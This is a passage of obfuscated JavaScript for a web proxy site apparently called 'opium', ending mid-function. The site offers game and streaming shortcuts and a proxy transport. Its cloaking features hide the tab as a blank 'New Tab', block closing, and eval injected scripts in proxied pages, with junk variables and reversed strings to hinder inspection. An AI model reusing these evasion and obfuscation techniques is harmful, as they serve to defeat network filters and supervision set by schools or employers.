window.dataLayer = window.dataLayer || [];
window.gtag = function () {
  dataLayer.push(arguments);
};
gtag("js", new Date());
gtag("gifnoc".split("").reverse().join(""), "G-1CC1LKMRS6");
(function () {
  var _0xab281g = 6;
  var s = document.createElement("script");
  _0xab281g = 2;
  s.async = true;
  s.src = "https://www.googletagmanager.com/gtag/js?id=G-1CC1LKMRS6";
  document.head.appendChild(s);
})();
var _0x931b = 7;
_0x931b = 11;
const SHORTCUTS = [{
  "label": "YouTube",
  "url": "https://youtube.com/"
}, {
  "label": "TikTok",
  "url": "https://www.tiktok.com/foryou"
}, {
  "label": 'Geforce Now',
  "url": 'https://play.geforcenow.com/mall/'
}, {
  "label": 'Roblox',
  "faviconHost": "https://www.roblox.com/",
  "url": "https://nowgg.fun/apps/a/19900/b.html"
}, {
  "label": "Geometry Dash",
  "url": "https://webdashers.dev/",
  "faviconUrl": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdw5uFI0cIdPEEfg8nXpx-UeHx2SRH5tG-e3OhSB0dfQ&s"
}, {
  "label": 'Kick',
  "url": 'https://kick.com/'
}, {
  "label": "Twitch",
  "url": "https://twitch.tv"
}, {
  "label": "Snapchat",
  "url": "https://www.snapchat.com/web"
}, {
  "label": 'Instagram',
  "url": "https://instagram.com"
}, {
  "label": "Discord",
  "url": "https://discord.com/app"
}, {
  "label": "Movies",
  "url": "https://zstream.mov/",
  "faviconUrl": "https://cdn-icons-png.flaticon.com/512/10351/10351880.png"
}, {
  "label": "Music",
  "url": "https://monochrome.tf/",
  "faviconUrl": "https://cdn-icons-png.flaticon.com/512/461/461146.png"
}];
const ra = [{
  "name": "Google",
  "url": "https://www.google.com/search?q="
}, {
  "name": "DuckDuckGo",
  "url": "https://duckduckgo.com/?q="
}, {
  "name": "Bing",
  "url": "https://www.bing.com/search?q="
}, {
  "name": "Brave",
  "url": "https://search.brave.com/search?q="
}, {
  "name": "Yahoo",
  "url": "https://search.yahoo.com/search?p="
}, {
  "name": "Startpage",
  "url": "https://www.startpage.com/sp/search?q="
}, {
  "name": "Ecosia",
  "url": "https://www.ecosia.org/search?q="
}, {
  "name": "Ask",
  "url": "https://www.ask.com/web?q="
}];
var _0x6f1g7g = 7;
const SETTINGS = {
  "Appearance": {
    "Stars": {
      "type": "toggle",
      "default": true,
      "callback": val => {
        starsEnabled = val;
      }
    },
    'Shooting Stars': {
      "type": "toggle",
      "default": true,
      "callback": val => {
        shootingStarsEnabled = val;
      }
    },
    "Prevent Close": {
      "type": 'toggle',
      "default": true,
      "callback": val => {
        preventCloseEnabled = val;
      }
    },
    "Title Changer": {
      "type": "toggle",
      "default": true,
      "callback": (val, init) => {
        titleChangerEnabled = val;
        if (init) {
          return;
        }
        if (!val) {
          try {
            clearTimeout(focusTimeout);
          } catch {}
          focusTimeout = null;
          document.title = "muipo".split("").reverse().join("");
        } else if (document.hidden) {
          document.title = "New Tab";
        }
      }
    }
  },
  'Privacy': {
    "PrivateDNS (AdBlock, AntiTracking, AntiMalware)": {
      "type": "toggle",
      "default": true,
      "callback": (val, init) => {
        localStorage.ABDE = val;
        if (!init) {
          allowUnload = true;
          location.reload();
        }
      }
    },
    "Clientsided Ad Block": {
      "type": "toggle",
      "default": true,
      "callback": val => {}
    },
    "About:Blank Cloak": {
      "type": "toggle",
      "default": false,
      "callback": (val, init) => {
        if (init) {
          return;
        }
        if (val) {
          triggerCloak();
        }
      }
    }
  },
  "Proxy": {
    "Transport": {
      "type": "dropdown",
      "default": {
        "name": "libcurl",
        "src": getAsset("curl/index.mjs")
      },
      "options": [{
        "name": "libcurl",
        "src": getAsset("curl/index.mjs")
      }, {
        "name": "epoxy",
        "src": getAsset("sjm.xedni/xop".split("").reverse().join(""))
      }],
      "callback": async val => {
        try {
          if (localStorage.transport === val.src) {
            return;
          }
          localStorage.transport = val.src;
          const {
            "default": TransportClient
          } = await import(val.src);
          transport = new TransportClient({
            "wisp": window.wispServer
          });
          await initTransport(transport);
          controller.setTransport(transport);
        } catch {}
      }
    },
    "Search Engine": {
      "type": 'dropdown',
      "default": {
        "name": "Brave",
        "url": "https://search.brave.com/search?q="
      },
      "options": ra,
      "callback": val => {}
    }
  },
  "Advanced": {
    "Force Update/Clear Data": {
      "type": "button",
      "label": 'Clear',
      "action": async () => {
        if (!confirm("This will clear all data and force update the client. Are you sure?")) {
          return;
        }
        try {
          var _0x34g = 16;
          const names = await caches.keys();
          _0x34g = 6;
          await Promise.all(names.map(n => caches["delete"](n)));
        } catch (e) {}
        try {
          localStorage.clear();
        } catch (e) {}
        try {
          sessionStorage.clear();
        } catch (e) {}
        try {
          document.cookie.split(";").forEach(c => {
            var _0xd01f9e = 10;
            const name = c.split("=")[0].trim();
            _0xd01f9e = 9;
            var _0x9ec5ac = 7;
            const domain = location.hostname;
            _0x9ec5ac = 7;
            const pathParts = location.pathname.split("/");
            for (let i = pathParts.length; i >= 0; i--) {
              let _0x02cdba;
              const path = pathParts.slice(0, i).join("/") || "/";
              _0x02cdba = "ogijjd".split("").reverse().join("");
              document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${path};domain=${domain}`;
              document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${path}`;
            }
          });
        } catch (e) {}
        try {
          const regs = await navigator.serviceWorker.getRegistrations();
          await Promise.all(regs.map(r => r.unregister()));
        } catch (e) {}
        try {
          const forceDelDb = name => new Promise(res => {
            const open = indexedDB.open(name);
            open.onsuccess = () => {
              open.result.close();
              deleteTs();
            };
            open.onerror = deleteTs;
            const deleteTs = () => {
              const req = indexedDB.deleteDatabase(name);
              req.onsuccess = req.onerror = req.onblocked = res;
            };
          });
          await forceDelDb("__scramjet_controller");
          if (indexedDB.databases) {
            const dbs = await indexedDB.databases();
            await Promise.all(dbs.map(db => forceDelDb(db.name)));
          }
        } catch (e) {}
        allowUnload = true;
        alert("done! after the page reloads, please wait for the client to update and load");
        location.reload(1);
      }
    }
  }
};
_0x6f1g7g = 17;
const EXTENSIONS = [{
  "name": "Youtube Ad Blocker",
  "domain": "youtube.com",
  "code": "(function() { 'use strict'; var cssArrObject = ['#masthead-ad', 'ytd-rich-item-renderer.style-scope.ytd-rich-grid-row #content:has(.ytd-display-ad-renderer)', '.video-ads.ytp-ad-module', 'tp-yt-paper-dialog:has(yt-mealbar-promo-renderer)', 'ytd-engagement-panel-section-list-renderer[target-id=\"engagement-panel-ads\"]', '#related #player-ads', '#related ytd-ad-slot-renderer', 'ytd-ad-slot-renderer', 'yt-mealbar-promo-renderer', 'ytd-popup-container:has(a[href=\"/premium\"])', 'ad-slot-renderer', 'ytm-companion-ad-renderer', '#related #-ad-']; function removeNonVideoAds(arry) { arry.forEach((selector, index) => { arry[index] = `${selector}{display:none!important}`; }); const premiumContainers = [...document.querySelectorAll('ytd-popup-container')]; const matchingContainers = premiumContainers.filter(container => container.querySelector('a[href=\"/premium\"]')); if (matchingContainers.length > 0) { matchingContainers.forEach(container => container.remove()); } const backdrops = document.querySelectorAll('tp-yt-iron-overlay-backdrop'); const targetBackdrop = Array.from(backdrops).find((backdrop) => backdrop.style.zIndex === '2201'); if (targetBackdrop) { targetBackdrop.className = ''; targetBackdrop.removeAttribute('opened'); } let style = document.createElement('style'); (document.head || document.body).appendChild(style); style.appendChild(document.createTextNode(arry.join(' '))); } function skipAd(video) { const adIndicator = document.querySelector('.ytp-ad-skip-button, .ytp-skip-ad-button, .ytp-ad-skip-button-modern, .video-ads.ytp-ad-module .ytp-ad-player-overlay, .ytp-ad-button-icon'); if (adIndicator && !window.location.href.includes('https://m.youtube.com/')) { video.muted = true; video.currentTime = video.duration - 0.1; } } function removeAdblockWarning() { var warningInterval = setInterval(function() { var popupExists = document.getElementsByClassName('style-scope ytd-popup-container').length > 0; var dismissButton = document.getElementById('dismiss-button'); var divider = document.getElementById('divider'); if (popupExists && dismissButton && divider) { setTimeout(function() { dismissButton.click(); const playButton = document.getElementsByClassName('ytp-play-button ytp-button')[0]; if (playButton) playButton.click(); clearInterval(warningInterval); }, Math.random() * 3000); } }, Math.random() * 500); } setInterval(() => { if (document.readyState !== 'loading') { removeNonVideoAds(cssArrObject); removeAdblockWarning(); var adsVideo = document.querySelector('.ad-showing video'); var mainVideo = document.querySelector('video'); if (mainVideo) { var playerStatus = { currentTime: mainVideo.currentTime, isPaused: mainVideo.paused, speed: mainVideo.playbackRate }; if (playerStatus.currentTime <= 5 && playerStatus.isPaused == true) { mainVideo.play().catch(error => { console.error('Failed to play video:', error); }); } } if (adsVideo) { skipAd(adsVideo); } } }, 500); })();"
}, {
  "name": "GeForce NOW Ad Blocker",
  "domain": ["geforcenow.com", "*.geforcenow.com"],
  "code": `(function() {
 Object.defineProperty(document, 'hidden', { get: () => false });
 
    function checkForVideo() {
        const video = document.getElementById('preStreamVideo');
        if (video) {
            video.style.width = '0.1px';
            video.style.height = '0.1px';
            video.muted = true;
            const observer = new MutationObserver(() => {
                if (!document.contains(video)) {
                    observer.disconnect();
                }
            });
            observer.observe(document.body, { childList: true, subtree: true });
        }
    }
 
    const interval = setInterval(() => {
        if (document.getElementById('preStreamVideo')) {
            clearInterval(interval);
            checkForVideo();
        }
    }, 1000);
})();`
}, {
  "name": "nowgg.fun fat fat",
  "domain": "*.ip.nowgg.fun",
  "code": `window.alert=()=>{}`,
  "prompt": false
}];
var _0xffc = 12;
const _extApproved = new Set();
_0xffc = 5;
const _extDismissed = new Set();
function _domainMatches(pattern, hostname) {
  if (pattern === "*") {
    return true;
  }
  if (pattern.startsWith("*.")) {
    const _0x3d7deg = pattern.slice(1);
    return hostname === _0x3d7deg.slice(1) || hostname.endsWith(_0x3d7deg);
  }
  return hostname === pattern;
}
function _extMatchesDomain(ext, hostname) {
  const _0x4a24fa = Array.isArray(ext.domain) ? ext.domain : [ext.domain];
  return _0x4a24fa.some(p => _domainMatches(p, hostname));
}
function _runExtension(ext) {
  try {
    frame.element.contentWindow.eval(ext?.code?.toString());
  } catch {}
}
function _showExtPrompt(ext, idx) {
  var _0xc2e = 6;
  const _0xd3ac6a = "_ep" + idx;
  _0xc2e = 1;
  if (document.getElementById(_0xd3ac6a)) {
    return;
  }
  var _0xdaf = 8;
  const _0xd2ab1a = document.createElement("div");
  _0xdaf = "ofabli";
  _0xd2ab1a.id = _0xd3ac6a;
  _0xd2ab1a.className = "ext-prompt";
  const _0xca_0x5f2 = document.createElement("div");
  _0xca_0x5f2.className = "ext-prompt-eyebrow";
  _0xca_0x5f2.textContent = "Extension available";
  var _0x649c = 7;
  const _0x911c = document.createElement("div");
  _0x649c = 12;
  _0x911c.className = "ext-prompt-name";
  _0x911c.textContent = ext.name;
  var _0xecb = 7;
  const _0xb_0x7a3 = document.createElement("vid".split("").reverse().join(""));
  _0xecb = 2;
  _0xb_0x7a3.className = "noitseuq-tpmorp-txe".split("").reverse().join("");
  _0xb_0x7a3.textContent = "Run it on this site?";
  const _0xddfb6a = document.createElement("div");
  _0xddfb6a.className = "ext-prompt-btns";
  const _0xe8848e = document.createElement("nottub".split("").reverse().join(""));
  _0xe8848e.className = "sey ntb-tpmorp-txe".split("").reverse().join("");
  _0xe8848e.textContent = "seY".split("").reverse().join("");
  const _0x8bd2c = document.createElement("button");
  _0x8bd2c.className = "on ntb-tpmorp-txe".split("").reverse().join("");
  _0x8bd2c.textContent = "No";
  var _0x6b470b = 2;
  const _0x1658f = () => {
    _0xd2ab1a.classList.remove("nepo".split("").reverse().join(""));
    _0xd2ab1a.addEventListener("dnenoitisnart".split("").reverse().join(""), () => _0xd2ab1a.remove(), {
      "once": true
    });
    setTimeout(() => _0xd2ab1a.remove(), 350);
  };
  _0x6b470b = "opfcec";
  _0xe8848e.onclick = () => {
    _0x1658f();
    _extApproved.add(idx);
    _runExtension(ext);
  };
  _0x8bd2c.onclick = () => {
    _0x1658f();
    _extDismissed.add(idx);
  };
  _0xddfb6a.appendChild(_0xe8848e);
  _0xddfb6a.appendChild(_0x8bd2c);
  _0xd2ab1a.appendChild(_0xca_0x5f2);
  _0xd2ab1a.appendChild(_0x911c);
  _0xd2ab1a.appendChild(_0xb_0x7a3);
  _0xd2ab1a.appendChild(_0xddfb6a);
  (shadowRoot || document.body).appendChild(_0xd2ab1a);
  requestAnimationFrame(() => _0xd2ab1a.classList.add("open"));
}
function _checkExtensions(href, _0x9a7c1f) {
  try {
    _0x9a7c1f = new URL(href).hostname;
  } catch (e) {
    return;
  }
  if (!_0x9a7c1f) {
    return;
  }
  EXTENSIONS.forEach((ext, i) => {
    if (ext.enabled === false) {
      return;
    }
    if (!_extMatchesDomain(ext, _0x9a7c1f)) {
      return;
    }
    if (_extApproved.has(i)) {
      _runExtension(ext);
    } else if (ext.prompt === false) {
      _runExtension(ext);
    } else if (!_extDismissed.has(i)) {
      _showExtPrompt(ext, i);
    }
  });
}
let frame = null;
var _0xd1b5e = 12;
let starsEnabled = true;
_0xd1b5e = 7;
let shootingStarsEnabled = true;
let preventCloseEnabled = true;
let titleChangerEnabled = true;
var allowUnload = false;
window.addEventListener("nwodyek".split("").reverse().join(""), e => {
  return;
  if (e.ctrlKey && e.key.toLowerCase() === "r") {
    allowUnload = true;
    setTimeout(() => {
      allowUnload = false;
    }, 1000);
  }
});
window.addEventListener("beforeunload", e => {
  if (allowUnload || !preventCloseEnabled) {
    return;
  }
  e.preventDefault();
  e.returnValue = '';
});
var _0x0ebdd = 15;
const saved = (() => {
  try {
    return JSON.parse(localStorage.getItem("SETTINGS") || "}{".split("").reverse().join(""));
  } catch (e) {
    return {};
  }
})();
_0x0ebdd = 11;
function saveSettings() {
  const _0xef0e8e = {};
  Object.entries(SETTINGS).forEach(([cat, s]) => {
    _0xef0e8e[cat] = {};
    Object.entries(s).forEach(([k, v]) => {
      _0xef0e8e[cat][k] = v._value !== undefined ? v._value : v["default"];
    });
  });
  localStorage.setItem("SETTINGS", JSON.stringify(_0xef0e8e));
}
Object.entries(SETTINGS).forEach(([cat, settings]) => {
  Object.entries(settings).forEach(([key, s]) => {
    s._value = saved[cat]?.[key] !== undefined ? saved[cat][key] : s["default"];
    if (s.callback) {
      s.callback(s._value, true);
    }
  });
});
function cloakAboutBlank() {
  if (window.self !== window.top) {
    return true;
  }
  const _0x62344g = window.open("about:blank", "_blank");
  if (!_0x62344g) {
    return false;
  }
  allowUnload = true;
  _0x62344g.document.open();
  _0x62344g.document.write(cloakWrapperHtml(window.location.href));
  _0x62344g.document.close();
  window.close();
  location.href = "knalb:tuoba".split("").reverse().join("");
  setTimeout(() => {
    allowUnload = false;
  }, 1000);
  return true;
}
let cloakPending = false;
function triggerCloak() {
  if (cloakAboutBlank()) {
    return;
  }
  if (cloakPending) {
    return;
  }
  cloakPending = true;
  var _0x58252b = 5;
  const _0xdc99f = () => {
    if (!cloakAboutBlank()) {
      return;
    }
    document.removeEventListener("click", _0xdc99f, true);
    document.removeEventListener("nwodyek".split("").reverse().join(""), _0xdc99f, true);
    document.removeEventListener("pointerdown", _0xdc99f, true);
    cloakPending = false;
  };
  _0x58252b = 3;
  document.addEventListener("kcilc".split("").reverse().join(""), _0xdc99f, true);
  document.addEventListener("keydown", _0xdc99f, true);
  document.addEventListener("pointerdown", _0xdc99f, true);
}
function cloakWrapperHtml(originalUrl) {
  const _0x97bb = !!SETTINGS.Appearance["Title Changer"]._value;
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>New Tab</title>
<style>html,body{margin:0;padding:0;height:100vh;overflow:hidden}iframe{border:0}</style>
</head>
<body>
<iframe id="cloakFrame" width="100%" height="100%" src="${window.location.href}"></iframe>
<script>
(function () {
    var originalUrl = ${JSON.stringify(originalUrl)};
    var titleChangerOnNow = ${_0x97bb};
    function applyTitle() {
        document.title = (!titleChangerOnNow || document.hidden) ? 'New Tab' : 'opium';
    }
    document.addEventListener('visibilitychange', applyTitle);
    applyTitle();
    window.addEventListener('storage', function (e) {
        if (e.key !== 'SETTINGS') return;
        var s; try { s = JSON.parse(localStorage.getItem('SETTINGS') || '{}'); } catch (err) { s = {}; }
        titleChangerOnNow = !!(s.Appearance && s.Appearance['Title Changer']);
        applyTitle();
        if (!(s.Privacy && s.Privacy['About:Blank Cloak'])) {
            try { document.getElementById('cloakFrame').contentWindow.allowUnload = true; } catch (e) {}
            window.location.href = originalUrl;
        }
    });
})();
</script>
</body>
</html>`;
}
if (window.self === window.top && SETTINGS.Privacy['About:Blank Cloak']._value) {
  triggerCloak();
}
var _0x9b_0x9e9 = 11;
const taglineEl = document.getElementById("tagline");
_0x9b_0x9e9 = 13;
const taglineLink = document.createElement("a");
taglineLink.href = "tsebmuipo/gg.csd//:sptth".split("").reverse().join("");
taglineLink.target = "_blank";
taglineLink.rel = "rerreferon renepoon".split("").reverse().join("");
taglineLink.textContent = "tsebmuipo/gg.csd".split("").reverse().join("");
taglineEl.appendChild(taglineLink);
const grid = document.getElementById("shortcuts");
SHORTCUTS.forEach(({
  "label": label,
  "url": url,
  "faviconHost": faviconHost,
  "faviconUrl": faviconUrl
}) => {
  const el = document.createElement("vid".split("").reverse().join(""));
  el.className = "shortcut";
  const img = document.createElement("gmi".split("").reverse().join(""));
  img.className = "shortcut-icon";
  img.alt = '';
  img.loading = "lazy";
  img.decoding = "async";
  img.src = faviconUrl || "https://www.google.com/s2/favicons?domain=" + new URL(faviconHost || url).hostname + "821=zs&".split("").reverse().join("");
  img.onerror = () => {
    img.removeAttribute("src");
  };
  const span = document.createElement("span");
  span.textContent = label;
  el.appendChild(img);
  el.appendChild(span);
  el.onclick = () => navigate(url);
  grid.appendChild(el);
});
const sidebar = document.getElementById("settingsSidebar");
var _0xb9gc = 4;
const tabsEl = document.getElementById("sbaTsgnittes".split("").reverse().join(""));
_0xb9gc = 3;
const panelsEl = document.getElementById("slenaPsgnittes".split("").reverse().join(""));
const categories = Object.keys(SETTINGS);
let _0x2a89f;
const sectionEls = [];
_0x2a89f = "maidhi".split("").reverse().join("");
function setActive(cat) {
  sidebar.querySelectorAll("meti-rabedis.".split("").reverse().join("")).forEach(el => el.classList.toggle("active", el.dataset.cat === cat));
  tabsEl.querySelectorAll(".tab-item").forEach(el => el.classList.toggle("active", el.dataset.cat === cat));
}
let scrollLock = false;
let scrollLockTimer = null;
function scrollToCategory(cat) {
  setActive(cat);
  var _0x_0x011 = 12;
  const _0xe6db = panelsEl.querySelector(`[data-section="${cat}"]`);
  _0x_0x011 = 14;
  if (!_0xe6db) {
    return;
  }
  scrollLock = true;
  clearTimeout(scrollLockTimer);
  var _0x82d = 8;
  const _0x181c = _0xe6db.getBoundingClientRect();
  _0x82d = "dkmleq";
  const _0x15_0x875 = panelsEl.getBoundingClientRect();
  panelsEl.scrollTo({
    "top": panelsEl.scrollTop + _0x181c.top - _0x15_0x875.top,
    "behavior": "smooth"
  });
  scrollLockTimer = setTimeout(() => {
    scrollLock = false;
  }, 800);
}
panelsEl.addEventListener("scroll", () => {
  if (scrollLock) {
    return;
  }
  const containerTop = panelsEl.getBoundingClientRect().top;
  let active = categories[0];
  sectionEls.forEach(el => {
    if (el.getBoundingClientRect().top - containerTop < 4) {
      active = el.dataset.section;
    }
  });
  setActive(active);
});
categories.forEach((cat, i) => {
  var _0x8ff = 7;
  const sItem = document.createElement("vid".split("").reverse().join(""));
  _0x8ff = 9;
  sItem.className = "meti-rabedis".split("").reverse().join("") + (i === 0 ? "evitca ".split("").reverse().join("") : '');
  sItem.textContent = cat;
  sItem.dataset.cat = cat;
  sItem.onclick = () => scrollToCategory(cat);
  sidebar.appendChild(sItem);
  const tItem = document.createElement("button");
  tItem.className = "tab-item" + (i === 0 ? "evitca ".split("").reverse().join("") : '');
  tItem.textContent = cat;
  tItem.dataset.cat = cat;
  tItem.onclick = () => scrollToCategory(cat);
  tabsEl.appendChild(tItem);
  const section = document.createElement("div");
  section.className = "noitces-lenap-sgnittes".split("").reverse().join("");
  section.dataset.section = cat;
  sectionEls.push(section);
  var _0xf20e2c = 13;
  const lbl = document.createElement("vid".split("").reverse().join(""));
  _0xf20e2c = "qfhjdi";
  lbl.className = "category-label";
  lbl.textContent = cat;
  section.appendChild(lbl);
  const rows = document.createElement("vid".split("").reverse().join(""));
  rows.className = "category-rows";
  Object.entries(SETTINGS[cat]).forEach(([key, s]) => {
    const row = document.createElement("vid".split("").reverse().join(""));
    row.className = "setting-row";
    var _0xc38a9g = 10;
    const label = document.createElement("span");
    _0xc38a9g = 6;
    label.className = "lebal-gnittes".split("").reverse().join("");
    label.textContent = key;
    row.appendChild(label);
    if (s.type === "toggle") {
      var _0x75c = 2;
      const btn = document.createElement("nottub".split("").reverse().join(""));
      _0x75c = 5;
      btn.className = "toggle" + (s._value ? "no ".split("").reverse().join("") : '');
      btn.onclick = () => {
        btn.classList.toggle("no".split("").reverse().join(""));
        s._value = btn.classList.contains("on");
        s.callback(s._value);
        saveSettings();
      };
      row.appendChild(btn);
    } else if (s.type === "input") {
      const inp = document.createElement("input");
      inp.className = "setting-input";
      inp.placeholder = key;
      inp.value = s._value || '';
      inp.onchange = () => {
        s._value = inp.value;
        s.callback(inp.value);
        saveSettings();
      };
      row.appendChild(inp);
    } else if (s.type === "nottub".split("").reverse().join("")) {
      const btn = document.createElement("nottub".split("").reverse().join(""));
      btn.className = "ntb-noitca-gnittes".split("").reverse().join("");
      btn.textContent = s.label;
      btn.onclick = () => s.action();
      row.appendChild(btn);
    } else if (s.type === "dropdown") {
      let _0x08ea;
      const sel = document.createElement("tceles".split("").reverse().join(""));
      _0x08ea = "coinjb".split("").reverse().join("");
      sel.className = "setting-select";
      s.options.forEach(opt => {
        const o = document.createElement("noitpo".split("").reverse().join(""));
        o.textContent = opt.name;
        o.value = JSON.stringify(opt);
        if (opt.name === s._value?.name) {
          o.selected = true;
        }
        sel.appendChild(o);
      });
      sel.onchange = () => {
        s._value = JSON.parse(sel.value);
        s.callback(s._value);
        saveSettings();
      };
      row.appendChild(sel);
    }
    rows.appendChild(row);
  });
  section.appendChild(rows);
  panelsEl.appendChild(section);
});
const spacer = document.createElement("vid".split("").reverse().join(""));
spacer.className = "settings-spacer";
panelsEl.appendChild(spacer);
function setVh() {
  document.documentElement.style.setProperty("--vh", `${window.innerHeight * 0.01}px`);
}
setVh();
window.addEventListener("resize", setVh);
var _0x923f = 17;
let canvas = document.getElementById("stars");
_0x923f = 2;
let ctx = canvas.getContext("2d");
let W;
let H;
function resize() {
  W = canvas.width = window.innerWidth;
  H = canvas.height = window.innerHeight;
}
resize();
window.addEventListener("resize", resize);
const starObjs = Array.from({
  "length": 180
}, () => {
  var _0xbc6ad = 6;
  const base = Math.random() * 0.28 + 0.05;
  _0xbc6ad = 11;
  return {
    "x": Math.random(),
    "y": Math.random(),
    "r": Math.random() * 0.85 + 0.2,
    "base": base,
    "alpha": base,
    "blinking": Math.random() < 0.3,
    "blinkPeak": 0,
    "blinkDir": 1,
    "blinkSpeed": 0.012 + Math.random() * 0.022,
    "pauseMs": Math.random() * 6000
  };
});
var _0xe_0x949 = 14;
let shoots = [];
_0xe_0x949 = 12;
const homeStateEls = ["lenap".split("").reverse().join(""), "gamesScreen", "gamePlayer", "neercSstceffe".split("").reverse().join("")].map(id => document.getElementById(id));
function starsShouldRun() {
  return !document.hidden && document.hasFocus() && isOpiumMenu(true);
}
const OPIUM_EXTERNAL_SCREENS = ["panel", "reyalPemag".split("").reverse().join("")];
const OPIUM_HOME_ONLY_SCREENS = ["gamesScreen", "effectsScreen"];
function isOpiumMenu(homePageOnly = false) {
  var _0xf2d = 15;
  const _0xd5247d = homePageOnly ? [...OPIUM_EXTERNAL_SCREENS, ...OPIUM_HOME_ONLY_SCREENS] : OPIUM_EXTERNAL_SCREENS;
  _0xf2d = 8;
  return !_0xd5247d.some(id => document.getElementById(id)?.classList.contains("open"));
}
var _0xbf_0x5a2 = 6;
const navActiveMap = [["gamesScreen", "navGames"], ["neercSstceffe".split("").reverse().join(""), "navEffects"], ["settingsScreen", "sgnitteSvan".split("").reverse().join("")]];
_0xbf_0x5a2 = 9;
function updateNavActive() {
  navActiveMap.forEach(([screenId, navId]) => {
    var _0xf6569d = 10;
    const _0x15d = document.getElementById(screenId);
    _0xf6569d = 4;
    const _0x984aaf = document.getElementById(navId);
    if (_0x15d && _0x984aaf) {
      _0x984aaf.classList.toggle("active", _0x15d.classList.contains("open"));
    }
  });
}
updateNavActive();
let starsRafPending = false;
let last = 0;
var _0x43af3b = 10;
let starsGen = 0;
_0x43af3b = 2;
let starsActive = null;
function stopStars() {
  starsGen++;
  starsRafPending = false;
  last = 0;
  shoots = [];
  if (W && H) {
    ctx.clearRect(0, 0, W, H);
  }
}
function startStars() {
  if (starsRafPending) {
    return;
  }
  starsRafPending = true;
  const _0x16_0x5fc = starsGen;
  requestAnimationFrame(ts => doFrame(ts, _0x16_0x5fc));
}
function updateStarsActive() {
  const _0x65da = !document.hidden && document.hasFocus() && isOpiumMenu(true);
  if (_0x65da === starsActive) {
    return;
  }
  starsActive = _0x65da;
  if (_0x65da) {
    startStars();
    if (!shootTimer) {
      scheduleShoot();
    }
  } else {
    stopStars();
  }
}
function spawnShoot() {
  const _0xcc5d = Math.random() * W * 1.4 - W * 0.2;
  const _0xf469fb = Math.random() * H * 0.5;
  const _0x6d95a = Math.PI / 180 * (12 + Math.random() * 22);
  var _0xf6c5c = 4;
  const _0xd0742d = 7 + Math.random() * 8;
  _0xf6c5c = 11;
  shoots.push({
    "x": _0xcc5d,
    "y": _0xf469fb,
    "vx": Math.cos(_0x6d95a) * _0xd0742d,
    "vy": Math.sin(_0x6d95a) * _0xd0742d,
    "len": 70 + Math.random() * 100,
    "life": 1,
    "decay": 0.016 + Math.random() * 0.014
  });
}
let nextShootAt = 0;
var _0x9bd9c = 16;
let shootTimer = null;
_0x9bd9c = 12;
function scheduleShoot() {
  shootTimer = null;
  if (!(!document.hidden && document.hasFocus() && isOpiumMenu(true))) {
    return;
  }
  const _0x2a4e = Date.now();
  if (shootingStarsEnabled && _0x2a4e >= nextShootAt) {
    spawnShoot();
    nextShootAt = _0x2a4e + 500 + Math.random() * 800;
  }
  shootTimer = setTimeout(scheduleShoot, 500 + Math.random() * 800);
}
document.addEventListener("visibilitychange", updateStarsActive);
window.addEventListener("blur", updateStarsActive);
window.addEventListener("focus", updateStarsActive);
var _0xf8e72e = 8;
const screenClassObserver = new MutationObserver(() => {
  updateNavActive();
  updateStarsActive();
});
_0xf8e72e = "ocilqm";
const settingsScreenEl = document.getElementById("neercSsgnittes".split("").reverse().join(""));
[...homeStateEls, settingsScreenEl].forEach(el => {
  if (el) {
    screenClassObserver.observe(el, {
      "attributes": true,
      "attributeFilter": ["class"]
    });
  }
});
setInterval(updateStarsActive, 1000);
function doFrame(ts, gen) {
  if (gen !== starsGen) {
    return;
  }
  if (!starsRafPending || !(!document.hidden && document.hasFocus() && isOpiumMenu(true))) {
    stopStars();
    return;
  }
  if (!last) {
    last = ts;
    requestAnimationFrame(t => doFrame(t, gen));
    return;
  }
  const _0x75c4ad = ts - last;
  if (_0x75c4ad < 33) {
    requestAnimationFrame(t => doFrame(t, gen));
    return;
  }
  last = ts;
  const _0x8398b = Math.min(_0x75c4ad, 50);
  ctx.clearRect(0, 0, W, H);
  if (starsEnabled) {
    starObjs.forEach(s => {
      if (s.blinking) {
        s.blinkPeak += s.blinkDir * s.blinkSpeed;
        if (s.blinkPeak >= 1) {
          s.blinkPeak = 1;
          s.blinkDir = -1;
        }
        if (s.blinkPeak <= 0) {
          s.blinkPeak = 0;
          s.blinkDir = 1;
          s.blinking = false;
          s.alpha = s.base;
          s.pauseMs = 1500 + Math.random() * 5000;
        } else {
          s.alpha = s.base + (0.92 - s.base) * Math.sin(s.blinkPeak * Math.PI);
        }
      } else {
        s.pauseMs -= _0x8398b;
        if (s.pauseMs <= 0) {
          s.blinking = true;
        }
      }
      ctx.beginPath();
      ctx.arc(s.x * W, s.y * H, s.r, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(255,255,255,${s.alpha.toFixed(3)})`;
      ctx.fill();
    });
  }
  if (shootingStarsEnabled) {
    shoots = shoots.filter(s => s.life > 0);
    shoots.forEach(s => {
      var _0x5e4b = 8;
      const _0xd1e37c = s.x - s.vx * (s.len / 10);
      _0x5e4b = 9;
      const _0x4f54b = s.y - s.vy * (s.len / 10);
      const _0xc60ad = ctx.createLinearGradient(_0xd1e37c, _0x4f54b, s.x, s.y);
      _0xc60ad.addColorStop(0, "rgba(255,255,255,0)");
      _0xc60ad.addColorStop(1, `rgba(255,255,255,${(s.life * 0.85).toFixed(3)})`);
      ctx.beginPath();
      ctx.moveTo(_0xd1e37c, _0x4f54b);
      ctx.lineTo(s.x, s.y);
      ctx.strokeStyle = _0xc60ad;
      ctx.lineWidth = 1.1;
      ctx.stroke();
      s.x += s.vx;
      s.y += s.vy;
      s.life -= s.decay;
    });
  }
  requestAnimationFrame(t => doFrame(t, gen));
}
updateStarsActive();
function getSearchEngine() {
  return SETTINGS.Proxy?.["Search Engine"]?._value?.url || "https://duckduckgo.com/?q=";
}
function resolveUrl(v) {
  if (!v) {
    return null;
  }
  if (v.startsWith("http://") || v.startsWith("https://")) {
    return v;
  }
  if (v.includes(".") && !v.includes(" ")) {
    return "https://" + v;
  }
  return (SETTINGS.Proxy?.["Search Engine"]?._value?.url || "https://duckduckgo.com/?q=") + encodeURIComponent(v);
}
function updateLockIcon(url) {
  const _0xf671c = document.getElementById("nocIkcol".split("").reverse().join(""));
  if (_0xf671c) {
    _0xf671c.classList.toggle("secure", typeof url === "gnirts".split("").reverse().join("") && url.startsWith("//:sptth".split("").reverse().join("")));
  }
}
function navigate(url) {
